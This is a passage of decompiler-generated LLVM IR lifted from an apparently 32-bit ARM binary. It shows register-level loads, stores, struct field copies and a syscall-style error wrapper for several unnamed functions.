  store i32 %v0_16064, i32* @r1, align 4
  %v1_16068 = add i32 %v1_16060, 1
  store i32 %v1_16068, i32* @r2, align 4
  %v0_1606c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1606c, i32* @r0, align 4
  %v3_16070 = call i32 @function_13670(i32 %v0_1606c, i32 %v0_16064, i32 %v1_16068)
  %v0_16074 = load i32, i32* %r7.global-to-local, align 4
  %v1_16074 = add i32 %v0_16074, 8
  %v2_16074 = inttoptr i32 %v1_16074 to i16*
  %v3_16074 = load i16, i16* %v2_16074, align 2
  %v4_16074 = zext i16 %v3_16074 to i32
  store i32 %v4_16074, i32* %r3.global-to-local, align 4
  %v0_16078 = load i32, i32* @r4, align 4
  %v1_16078 = trunc i32 %v0_16078 to i8
  %v3_16078 = add i32 %v0_16074, 10
  %v4_16078 = inttoptr i32 %v3_16078 to i8*
  store i8 %v1_16078, i8* %v4_16078, align 1
  %v0_1607c = load i32, i32* %r7.global-to-local, align 4
  %v1_1607c = load i32, i32* %r3.global-to-local, align 4
  %v2_1607c = add i32 %v1_1607c, %v0_1607c
  store i32 %v2_1607c, i32* %r7.global-to-local, align 4
  %v1_16084.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16080

dec_label_pc_16080:                               ; preds = %.thread, %dec_label_pc_16054
  %v1_16084 = phi i32 [ %v1_16084.pre, %dec_label_pc_16054 ], [ %v1_160844, %.thread ]
  %v0_16054 = phi i32 [ %v2_1607c, %dec_label_pc_16054 ], [ %v0_160802, %.thread ]
  %v1_16080 = add i32 %v0_16054, 10
  store i32 %v1_16080, i32* %r6.global-to-local, align 4
  %v3_16084 = icmp ult i32 %v0_16054, %v1_16084
  %v1_1608c = add i32 %v0_16054, 11
  store i32 %v1_1608c, i32* %r8.global-to-local, align 4
  br i1 %v3_16084, label %dec_label_pc_16054, label %dec_label_pc_16094

dec_label_pc_16094:                               ; preds = %dec_label_pc_16080, %.thread, %dec_label_pc_1602c
  %v0_16094 = load i32, i32* @r5, align 4
  store i32 %v6_16010, i32* @r5, align 4
  store i32 %v18_16010, i32* @sl, align 4
  ret i32 %v0_16094

; uselistorder directives
  uselistorder i32 %v1_16080, { 1, 0 }
  uselistorder i32 %v0_16054, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_16010, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_13670, { 6, 5, 7, 4, 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16080, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_160a4() local_unnamed_addr {
dec_label_pc_160a4:
  %r7.global-to-local = alloca i32, align 4
  %v0_160ac = load i32, i32* @r1, align 4
  store i32 %v0_160ac, i32* @r3, align 4
  %v0_160bc = load i32, i32* @r0, align 4
  store i32 %v0_160bc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_160bc, -4095
  br i1 %tmp, label %dec_label_pc_160dc, label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160a4
  %v0_160c8 = call i32 @function_13574()
  %v0_160cc = load i32, i32* %r7.global-to-local, align 4
  %v1_160cc = sub i32 0, %v0_160cc
  store i32 %v1_160cc, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_160d4 = inttoptr i32 %v0_160c8 to i32*
  store i32 %v1_160cc, i32* %v2_160d4, align 4
  br label %dec_label_pc_160ec

dec_label_pc_160dc:                               ; preds = %dec_label_pc_160a4
  %v2_160dc = icmp eq i32 %v0_160bc, 0
  br i1 %v2_160dc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_160dc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_160dc, %bb
  call void @__pseudo_cond_branch(i1 %v2_160dc, i32 ptrtoint (i32* @global_var_162f4.670 to i32))
  br label %dec_label_pc_160ec

dec_label_pc_160ec:                               ; preds = %dec_label_pc_160c8, %.thread
  %v0_160ec = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_160ec

; uselistorder directives
  uselistorder i32 %v0_160bc, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_160ec, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_160fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_160fc:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_160fc = load i32, i32* @r4, align 4
  store i32 %v3_160fc, i32* %stack_var_-16, align 4
  store i32 135344, i32* %r4.global-to-local, align 4
  %v4_1610c = load i32, i32* @global_var_23390.673, align 4
  %v2_16110 = icmp eq i32 %v4_1610c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_16110, label %dec_label_pc_1611c, label %dec_label_pc_1612c

dec_label_pc_1611c:                               ; preds = %dec_label_pc_160fc
  %v1_16120 = call i32 @function_1809c(i32 0)
  %v1_16124 = icmp slt i32 %v1_16120, 0
  br i1 %v1_16124, label %dec_label_pc_16150, label %dec_label_pc_1612cthread-pre-split

dec_label_pc_1612cthread-pre-split:               ; preds = %dec_label_pc_1611c
  %v0_16130.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_1612c.pre = load i32, i32* @global_var_23390.673, align 4
  br label %dec_label_pc_1612c

dec_label_pc_1612c:                               ; preds = %dec_label_pc_1612cthread-pre-split, %dec_label_pc_160fc
  %v0_1613c = phi i32 [ %v4_1612c.pre, %dec_label_pc_1612cthread-pre-split ], [ %v4_1610c, %dec_label_pc_160fc ]
  %v1_16140 = phi i32 [ %v0_16130.pr, %dec_label_pc_1612cthread-pre-split ], [ %arg1, %dec_label_pc_160fc ]
  %v2_16130 = icmp eq i32 %v1_16140, 0
  store i32 %v0_1613c, i32* %r4.global-to-local, align 4
  br i1 %v2_16130, label %dec_label_pc_16154, label %dec_label_pc_1613c

dec_label_pc_1613c:                               ; preds = %dec_label_pc_1612c
  %v2_16140 = add i32 %v1_16140, %v0_1613c
  %v1_16144 = call i32 @function_1809c(i32 %v2_16140)
  %v1_16148 = icmp slt i32 %v1_16144, 0
  br i1 %v1_16148, label %dec_label_pc_16150, label %dec_label_pc_1613c.dec_label_pc_16154_crit_edge

dec_label_pc_1613c.dec_label_pc_16154_crit_edge:  ; preds = %dec_label_pc_1613c
  %v0_16154.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16154

dec_label_pc_16150:                               ; preds = %dec_label_pc_1613c, %dec_label_pc_1611c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16154

dec_label_pc_16154:                               ; preds = %dec_label_pc_1612c, %dec_label_pc_1613c.dec_label_pc_16154_crit_edge, %dec_label_pc_16150
  %v0_16154 = phi i32 [ %v0_16154.pre, %dec_label_pc_1613c.dec_label_pc_16154_crit_edge ], [ -1, %dec_label_pc_16150 ], [ %v0_1613c, %dec_label_pc_1612c ]
  %v2_16158 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16158, i32* @r4, align 4
  ret i32 %v0_16154

; uselistorder directives
  uselistorder i32 %v0_1613c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1809c, { 1, 0 }
  uselistorder label %dec_label_pc_16154, { 2, 1, 0 }
}

define i32 @function_16168(i32 %arg1) local_unnamed_addr {
dec_label_pc_16168:
  %v1_16178 = load i32, i32* @r0, align 4
  ret i32 %v1_16178
}

define i32 @function_1617c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1617c:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1617c = load i32, i32* @r4, align 4
  store i32 %v3_1617c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_16194 = inttoptr i32 %arg2 to i8*
  %v3_16194 = call i32 @function_135d0(i8* %v2_16194, i32 0)
  %v2_16198 = load i32, i32* %arg1, align 4
  store i32 %v2_16198, i32* %r3.global-to-local, align 4
  %v3_16198 = add i32 %tmp, 4
  %v4_16198 = inttoptr i32 %v3_16198 to i32*
  %v5_16198 = load i32, i32* %v4_16198, align 4
  store i32 %v5_16198, i32* %r4.global-to-local, align 4
  %v0_1619c = load i32, i32* %r5.global-to-local, align 4
  %v1_1619c = inttoptr i32 %v0_1619c to i32*
  store i32 %v2_16198, i32* %v1_1619c, align 4
  %v3_1619c = add i32 %v0_1619c, 4
  %v4_1619c = inttoptr i32 %v3_1619c to i32*
  %v5_1619c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1619c, i32* %v4_1619c, align 4
  %v0_161a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_161a0 = add i32 %v0_161a0, 12
  %v2_161a0 = inttoptr i32 %v1_161a0 to i32*
  %v3_161a0 = load i32, i32* %v2_161a0, align 4
  %v1_161a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_161a4 = add i32 %v1_161a4, 12
  %v3_161a4 = inttoptr i32 %v2_161a4 to i32*
  store i32 %v3_161a0, i32* %v3_161a4, align 4
  %v0_161a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_161a8 = add i32 %v0_161a8, 96
  store i32 %v1_161a8, i32* %r3.global-to-local, align 4
  %v1_161ac = inttoptr i32 %v1_161a8 to i32*
  %v2_161ac = load i32, i32* %v1_161ac, align 4
  store i32 %v2_161ac, i32* %r3.global-to-local, align 4
  %v3_161ac = add i32 %v0_161a8, 100
  %v4_161ac = inttoptr i32 %v3_161ac to i32*
  %v5_161ac = load i32, i32* %v4_161ac, align 4
  store i32 %v5_161ac, i32* %r4.global-to-local, align 4
  %v1_161b0 = add i32 %v0_161a8, 56
  %v2_161b0 = inttoptr i32 %v1_161b0 to i32*
  %v3_161b0 = load i32, i32* %v2_161b0, align 4
  store i32 %v3_161b0, i32* %r2.global-to-local, align 4
  %v1_161b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_161b4 = add i32 %v1_161b4, 96
  %v3_161b4 = inttoptr i32 %v2_161b4 to i32*
  store i32 %v2_161ac, i32* %v3_161b4, align 4
  %v0_161b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_161b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_161b8 = add i32 %v1_161b8, 100
  %v3_161b8 = inttoptr i32 %v2_161b8 to i32*
  store i32 %v0_161b8, i32* %v3_161b8, align 4
  %v0_161bc = load i32, i32* %r6.global-to-local, align 4
  %v1_161bc = add i32 %v0_161bc, 24
  store i32 %v1_161bc, i32* %ip.global-to-local, align 4
  %v1_161c0 = inttoptr i32 %v1_161bc to i32*
  %v2_161c0 = load i32, i32* %v1_161c0, align 4
  store i32 %v2_161c0, i32* %ip.global-to-local, align 4
  %v3_161c0 = add i32 %v0_161bc, 28
  %v4_161c0 = inttoptr i32 %v3_161c0 to i32*
  %v5_161c0 = load i32, i32* %v4_161c0, align 4
  store i32 %v5_161c0, i32* %lr.global-to-local, align 4
  %v0_161c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_161c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_161c4 = add i32 %v1_161c4, 56
  %v3_161c4 = inttoptr i32 %v2_161c4 to i32*
  store i32 %v0_161c4, i32* %v3_161c4, align 4
  %v0_161c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_161c8 = add i32 %v0_161c8, 72
  store i32 %v1_161c8, i32* %r3.global-to-local, align 4
  %v1_161cc = add i32 %v0_161c8, 32
  store i32 %v1_161cc, i32* %r7.global-to-local, align 4
  %v1_161d0 = inttoptr i32 %v1_161cc to i32*
  %v2_161d0 = load i32, i32* %v1_161d0, align 4
  store i32 %v2_161d0, i32* %r7.global-to-local, align 4
  %v3_161d0 = add i32 %v0_161c8, 36
  %v4_161d0 = inttoptr i32 %v3_161d0 to i32*
  %v5_161d0 = load i32, i32* %v4_161d0, align 4
  store i32 %v5_161d0, i32* %r8.global-to-local, align 4
  %v1_161d4 = inttoptr i32 %v1_161c8 to i32*
  %v2_161d4 = load i32, i32* %v1_161d4, align 4
  %v3_161d4 = add i32 %v0_161c8, 76
  %v4_161d4 = inttoptr i32 %v3_161d4 to i32*
  %v5_161d4 = load i32, i32* %v4_161d4, align 4
  store i32 %v5_161d4, i32* %r1.global-to-local, align 4
  %v0_161d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_161d8 = add i32 %v0_161d8, 72
  %v1_161dc = inttoptr i32 %v1_161d8 to i32*
  store i32 %v2_161d4, i32* %v1_161dc, align 4
  %v3_161dc = add i32 %v0_161d8, 76
  %v4_161dc = inttoptr i32 %v3_161dc to i32*
  %v5_161dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_161dc, i32* %v4_161dc, align 4
  %v0_161e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_161e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_161e0 = add i32 %v1_161e0, 32
  %v3_161e0 = inttoptr i32 %v2_161e0 to i32*
  store i32 %v0_161e0, i32* %v3_161e0, align 4
  %v0_161e4 = load i32, i32* %r8.global-to-local, align 4
  %v1_161e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_161e4 = add i32 %v1_161e4, 36
  %v3_161e4 = inttoptr i32 %v2_161e4 to i32*
  store i32 %v0_161e4, i32* %v3_161e4, align 4
  %v0_161e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_161e8 = add i32 %v0_161e8, 80
  store i32 %v1_161e8, i32* %r3.global-to-local, align 4
  %v1_161ec = add i32 %v0_161e8, 48
  store i32 %v1_161ec, i32* %r7.global-to-local, align 4
  %v1_161f0 = inttoptr i32 %v1_161ec to i32*
  %v2_161f0 = load i32, i32* %v1_161f0, align 4
  store i32 %v2_161f0, i32* %r7.global-to-local, align 4
  %v3_161f0 = add i32 %v0_161e8, 52
  %v4_161f0 = inttoptr i32 %v3_161f0 to i32*
  %v5_161f0 = load i32, i32* %v4_161f0, align 4
  store i32 %v5_161f0, i32* %r8.global-to-local, align 4
  %v1_161f4 = inttoptr i32 %v1_161e8 to i32*
  %v2_161f4 = load i32, i32* %v1_161f4, align 4
  %v3_161f4 = add i32 %v0_161e8, 84
  %v4_161f4 = inttoptr i32 %v3_161f4 to i32*
  %v5_161f4 = load i32, i32* %v4_161f4, align 4
  store i32 %v5_161f4, i32* %r1.global-to-local, align 4
  %v1_161f8 = add i32 %v0_161e8, 16
  %v2_161f8 = inttoptr i32 %v1_161f8 to i32*
  %v3_161f8 = load i32, i32* %v2_161f8, align 4
  store i32 %v3_161f8, i32* %r2.global-to-local, align 4
  %v0_161fc = load i32, i32* %r5.global-to-local, align 4
  %v1_161fc = add i32 %v0_161fc, 80
  %v1_16200 = inttoptr i32 %v1_161fc to i32*
  store i32 %v2_161f4, i32* %v1_16200, align 4
  %v3_16200 = add i32 %v0_161fc, 84
  %v4_16200 = inttoptr i32 %v3_16200 to i32*
  %v5_16200 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16200, i32* %v4_16200, align 4
  %v0_16204 = load i32, i32* %r7.global-to-local, align 4
  %v1_16204 = load i32, i32* %r5.global-to-local, align 4
  %v2_16204 = add i32 %v1_16204, 48
  %v3_16204 = inttoptr i32 %v2_16204 to i32*
  store i32 %v0_16204, i32* %v3_16204, align 4
  %v0_16208 = load i32, i32* %r8.global-to-local, align 4
  %v1_16208 = load i32, i32* %r5.global-to-local, align 4
  %v2_16208 = add i32 %v1_16208, 52
  %v3_16208 = inttoptr i32 %v2_16208 to i32*
  store i32 %v0_16208, i32* %v3_16208, align 4
  %v0_1620c = load i32, i32* %r2.global-to-local, align 4
  %v1_1620c = load i32, i32* %r5.global-to-local, align 4
  %v2_1620c = add i32 %v1_1620c, 16
  %v3_1620c = inttoptr i32 %v2_1620c to i32*
  store i32 %v0_1620c, i32* %v3_1620c, align 4
  %v0_16210 = load i32, i32* %r6.global-to-local, align 4
  %v1_16210 = add i32 %v0_16210, 88
  store i32 %v1_16210, i32* %r3.global-to-local, align 4
  %v1_16214 = add i32 %v0_16210, 20
  %v2_16214 = inttoptr i32 %v1_16214 to i32*
  %v3_16214 = load i32, i32* %v2_16214, align 4
  store i32 %v3_16214, i32* %r2.global-to-local, align 4
  %v1_16218 = inttoptr i32 %v1_16210 to i32*
  %v2_16218 = load i32, i32* %v1_16218, align 4
  %v3_16218 = add i32 %v0_16210, 92
  %v4_16218 = inttoptr i32 %v3_16218 to i32*
  %v5_16218 = load i32, i32* %v4_16218, align 4
  store i32 %v5_16218, i32* %r1.global-to-local, align 4
  %v1_1621c = add i32 %v0_16210, 64
  store i32 %v1_1621c, i32* %r6.global-to-local, align 4
  %v1_16220 = inttoptr i32 %v1_1621c to i32*
  %v2_16220 = load i32, i32* %v1_16220, align 4
  store i32 %v2_16220, i32* %r6.global-to-local, align 4
  %v3_16220 = add i32 %v0_16210, 68
  %v4_16220 = inttoptr i32 %v3_16220 to i32*
  %v5_16220 = load i32, i32* %v4_16220, align 4
  store i32 %v5_16220, i32* %r7.global-to-local, align 4
  %v0_16224 = load i32, i32* %r5.global-to-local, align 4
  %v1_16224 = add i32 %v0_16224, 88
  store i32 %v1_16224, i32* %r3.global-to-local, align 4
  %v2_16228 = add i32 %v0_16224, 20
  %v3_16228 = inttoptr i32 %v2_16228 to i32*
  store i32 %v3_16214, i32* %v3_16228, align 4
  %v0_1622c = load i32, i32* %ip.global-to-local, align 4
  %v1_1622c = load i32, i32* %r5.global-to-local, align 4
  %v2_1622c = add i32 %v1_1622c, 24
  %v3_1622c = inttoptr i32 %v2_1622c to i32*
  store i32 %v0_1622c, i32* %v3_1622c, align 4
  %v0_16230 = load i32, i32* %lr.global-to-local, align 4
  %v1_16230 = load i32, i32* %r5.global-to-local, align 4
  %v2_16230 = add i32 %v1_16230, 28
  %v3_16230 = inttoptr i32 %v2_16230 to i32*
  store i32 %v0_16230, i32* %v3_16230, align 4
  %v0_16234 = load i32, i32* %r6.global-to-local, align 4
  %v1_16234 = load i32, i32* %r5.global-to-local, align 4
  %v2_16234 = add i32 %v1_16234, 64
  %v3_16234 = inttoptr i32 %v2_16234 to i32*
  store i32 %v0_16234, i32* %v3_16234, align 4
  %v0_16238 = load i32, i32* %r7.global-to-local, align 4
  %v1_16238 = load i32, i32* %r5.global-to-local, align 4
  %v2_16238 = add i32 %v1_16238, 68
  %v3_16238 = inttoptr i32 %v2_16238 to i32*
  store i32 %v0_16238, i32* %v3_16238, align 4
  %v0_1623c = load i32, i32* %r3.global-to-local, align 4
  %v1_1623c = inttoptr i32 %v0_1623c to i32*
  store i32 %v2_16218, i32* %v1_1623c, align 4
  %v3_1623c = add i32 %v0_1623c, 4
  %v4_1623c = inttoptr i32 %v3_1623c to i32*
  %v5_1623c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1623c, i32* %v4_1623c, align 4
  %v2_16240 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16240, i32* %r4.global-to-local, align 4
  ret i32 %v2_16218

; uselistorder directives
  uselistorder i32 %v0_16210, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_161e8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 1, 0, 2 }
  uselistorder i32 104, { 5, 0, 1, 2, 6, 3, 7, 4, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_16248(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16248:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_16248 = load i32, i32* @r4, align 4
  store i32 %v3_16248, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_16260 = inttoptr i32 %arg2 to i8*
  %v3_16260 = call i32 @function_135d0(i8* %v2_16260, i32 0)
  %v2_16264 = load i32, i32* %arg1, align 4
  %v3_16264 = add i32 %tmp, 4
  %v4_16264 = inttoptr i32 %v3_16264 to i32*
  %v5_16264 = load i32, i32* %v4_16264, align 4
  store i32 %v5_16264, i32* %r4.global-to-local, align 4
  %v0_16268 = load i32, i32* %r6.global-to-local, align 4
  %v1_16268 = inttoptr i32 %v0_16268 to i32*
  store i32 %v2_16264, i32* %v1_16268, align 4
  %v3_16268 = add i32 %v0_16268, 4
  %v4_16268 = inttoptr i32 %v3_16268 to i32*
  %v5_16268 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16268, i32* %v4_16268, align 4
  %v0_1626c = load i32, i32* %r5.global-to-local, align 4
  %v1_1626c = add i32 %v0_1626c, 32
  %v1_16270 = inttoptr i32 %v1_1626c to i32*
  %v2_16270 = load i32, i32* %v1_16270, align 4
  %v3_16270 = add i32 %v0_1626c, 36
  %v4_16270 = inttoptr i32 %v3_16270 to i32*
  %v5_16270 = load i32, i32* %v4_16270, align 4
  store i32 %v5_16270, i32* %r4.global-to-local, align 4
  %v1_16274 = add i32 %v0_1626c, 96
  %v2_16274 = inttoptr i32 %v1_16274 to i32*
  %v3_16274 = load i32, i32* %v2_16274, align 4
  store i32 %v3_16274, i32* %r2.global-to-local, align 4
  %v1_16278 = load i32, i32* %r6.global-to-local, align 4
  %v2_16278 = add i32 %v1_16278, 32
  %v3_16278 = inttoptr i32 %v2_16278 to i32*
  store i32 %v2_16270, i32* %v3_16278, align 4
  %v0_1627c = load i32, i32* %r4.global-to-local, align 4
  %v1_1627c = load i32, i32* %r6.global-to-local, align 4
  %v2_1627c = add i32 %v1_1627c, 36
  %v3_1627c = inttoptr i32 %v2_1627c to i32*
  store i32 %v0_1627c, i32* %v3_1627c, align 4
  %v0_16280 = load i32, i32* %r2.global-to-local, align 4
  %v1_16280 = load i32, i32* %r6.global-to-local, align 4
  %v2_16280 = add i32 %v1_16280, 12
  %v3_16280 = inttoptr i32 %v2_16280 to i32*
  store i32 %v0_16280, i32* %v3_16280, align 4
  %v0_16284 = load i32, i32* %r5.global-to-local, align 4
  %v1_16284 = add i32 %v0_16284, 48
  %v2_16284 = inttoptr i32 %v1_16284 to i32*
  %v3_16284 = load i32, i32* %v2_16284, align 4
  %v1_16288 = add i32 %v0_16284, 24
  store i32 %v1_16288, i32* %ip.global-to-local, align 4
  %v1_1628c = inttoptr i32 %v1_16288 to i32*
  %v2_1628c = load i32, i32* %v1_1628c, align 4
  store i32 %v2_1628c, i32* %ip.global-to-local, align 4
  %v3_1628c = add i32 %v0_16284, 28
  %v4_1628c = inttoptr i32 %v3_1628c to i32*
  %v5_1628c = load i32, i32* %v4_1628c, align 4
  store i32 %v5_1628c, i32* %lr.global-to-local, align 4
  %v1_16290 = load i32, i32* %r6.global-to-local, align 4
  %v2_16290 = add i32 %v1_16290, 44
  %v3_16290 = inttoptr i32 %v2_16290 to i32*
  store i32 %v3_16284, i32* %v3_16290, align 4
  %v0_16294 = load i32, i32* %r5.global-to-local, align 4
  %v1_16294 = add i32 %v0_16294, 64
  %v2_16294 = inttoptr i32 %v1_16294 to i32*
  %v3_16294 = load i32, i32* %v2_16294, align 4
  %v1_16298 = add i32 %v0_16294, 56
  %v2_16298 = inttoptr i32 %v1_16298 to i32*
  %v3_16298 = load i32, i32* %v2_16298, align 4
  store i32 %v3_16298, i32* %r2.global-to-local, align 4
  %v1_1629c = load i32, i32* %r6.global-to-local, align 4
  %v2_1629c = add i32 %v1_1629c, 52
  %v3_1629c = inttoptr i32 %v2_1629c to i32*
  store i32 %v3_16294, i32* %v3_1629c, align 4
  %v0_162a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_162a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_162a0 = add i32 %v1_162a0, 48
  %v3_162a0 = inttoptr i32 %v2_162a0 to i32*
  store i32 %v0_162a0, i32* %v3_162a0, align 4
  %v0_162a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_162a4 = add i32 %v0_162a4, 72
  %v1_162a8 = inttoptr i32 %v1_162a4 to i32*
  %v2_162a8 = load i32, i32* %v1_162a8, align 4
  %v3_162a8 = add i32 %v0_162a4, 76
  %v4_162a8 = inttoptr i32 %v3_162a8 to i32*
  %v5_162a8 = load i32, i32* %v4_162a8, align 4
  store i32 %v5_162a8, i32* %r1.global-to-local, align 4
  %v0_162ac = load i32, i32* %r6.global-to-local, align 4
  %v1_162ac = add i32 %v0_162ac, 56
  %v1_162b0 = inttoptr i32 %v1_162ac to i32*
  store i32 %v2_162a8, i32* %v1_162b0, align 4
  %v3_162b0 = add i32 %v0_162ac, 60
  %v4_162b0 = inttoptr i32 %v3_162b0 to i32*
  %v5_162b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_162b0, i32* %v4_162b0, align 4
  %v0_162b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_162b4 = add i32 %v0_162b4, 80
  %v1_162b8 = inttoptr i32 %v1_162b4 to i32*
  %v2_162b8 = load i32, i32* %v1_162b8, align 4
  %v3_162b8 = add i32 %v0_162b4, 84
  %v4_162b8 = inttoptr i32 %v3_162b8 to i32*
  %v5_162b8 = load i32, i32* %v4_162b8, align 4
  store i32 %v5_162b8, i32* %r1.global-to-local, align 4
  %v0_162bc = load i32, i32* %r6.global-to-local, align 4
  %v1_162bc = add i32 %v0_162bc, 64
  %v1_162c0 = inttoptr i32 %v1_162bc to i32*
  store i32 %v2_162b8, i32* %v1_162c0, align 4
  %v3_162c0 = add i32 %v0_162bc, 68
  %v4_162c0 = inttoptr i32 %v3_162c0 to i32*
  %v5_162c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_162c0, i32* %v4_162c0, align 4
  %v0_162c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_162c4 = add i32 %v0_162c4, 16
  %v2_162c4 = inttoptr i32 %v1_162c4 to i32*
  %v3_162c4 = load i32, i32* %v2_162c4, align 4
  %v1_162c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_162c8 = add i32 %v1_162c8, 16
  %v3_162c8 = inttoptr i32 %v2_162c8 to i32*
  store i32 %v3_162c4, i32* %v3_162c8, align 4
  %v0_162cc = load i32, i32* %r5.global-to-local, align 4
  %v1_162cc = add i32 %v0_162cc, 88
  %v1_162d0 = add i32 %v0_162cc, 20
  %v2_162d0 = inttoptr i32 %v1_162d0 to i32*
  %v3_162d0 = load i32, i32* %v2_162d0, align 4
  store i32 %v3_162d0, i32* %r2.global-to-local, align 4
  %v1_162d4 = inttoptr i32 %v1_162cc to i32*
  %v2_162d4 = load i32, i32* %v1_162d4, align 4
  %v3_162d4 = add i32 %v0_162cc, 92
  %v4_162d4 = inttoptr i32 %v3_162d4 to i32*
  %v5_162d4 = load i32, i32* %v4_162d4, align 4
  store i32 %v5_162d4, i32* %r1.global-to-local, align 4
  %v0_162d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_162d8 = add i32 %v0_162d8, 72
  %v1_162dc = inttoptr i32 %v1_162d8 to i32*
  store i32 %v2_162d4, i32* %v1_162dc, align 4
  %v3_162dc = add i32 %v0_162d8, 76
  %v4_162dc = inttoptr i32 %v3_162dc to i32*
  %v5_162dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_162dc, i32* %v4_162dc, align 4
  %v0_162e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_162e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_162e0 = add i32 %v1_162e0, 20
  %v3_162e0 = inttoptr i32 %v2_162e0 to i32*
  store i32 %v0_162e0, i32* %v3_162e0, align 4
  %v0_162e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_162e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_162e4 = add i32 %v1_162e4, 24
  %v3_162e4 = inttoptr i32 %v2_162e4 to i32*
  store i32 %v0_162e4, i32* %v3_162e4, align 4
  %v0_162e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_162e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_162e8 = add i32 %v1_162e8, 28
  %v3_162e8 = inttoptr i32 %v2_162e8 to i32*
  store i32 %v0_162e8, i32* %v3_162e8, align 4
